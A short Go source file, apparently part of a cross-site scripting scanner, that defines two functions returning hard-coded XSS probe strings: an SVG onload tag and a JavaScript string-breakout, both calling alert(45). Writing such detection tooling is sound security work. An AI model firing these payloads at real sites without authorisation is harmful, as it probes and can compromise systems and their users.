package core

func getCommonPayload() [1]string {
	payload := [...]string{
		"<svg/onload=alert(45)>",
	}
	return payload
}

func getInJsPayload() [1]string {
	payload := [...]string{
		"'+alert(45)+'",
	}
	return payload
}
